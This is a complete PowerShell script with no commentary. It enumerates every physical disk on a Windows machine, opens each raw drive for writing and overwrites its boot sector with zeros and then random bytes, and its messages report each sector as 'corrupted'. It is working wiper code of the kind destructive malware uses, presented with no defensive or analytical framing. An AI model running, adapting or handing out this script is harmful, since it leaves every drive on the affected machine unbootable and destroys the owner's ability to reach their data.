Import-Module Storage -ErrorAction SilentlyContinue
$buffer = New-Object byte[] 512
[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($buffer)
try {
    $disks = Get-Disk | Select-Object -ExpandProperty Number
    Write-Host "Retrieved disk numbers: $($disks -join ', ')"
} catch {
    Write-Error "Failed to retrieve disk list: $_"
    exit
}
foreach ($DriveNumber in $disks) {
    Write-Host "Processing PhysicalDrive$DriveNumber"
    $drivePath = "\\.\PhysicalDrive$DriveNumber"
    try {
        Write-Host "Opening file stream for $drivePath"
        $fs = [System.IO.FileStream]::new($drivePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
        try {
            Write-Host "Writing zeros to boot sector"
            $fs.Write((New-Object byte[] 512), 0, 512)
            Write-Host "Writing random data to boot sector"
            $fs.Write($buffer, 0, 512)
        } finally {
            $fs.Close()
            Write-Host "Closed file stream"
        }
        Write-Host "Boot sector corrupted on PhysicalDrive$DriveNumber"
    } catch {
        Write-Error "Failed to corrupt boot sector on PhysicalDrive$($DriveNumber): $_"
    }
}
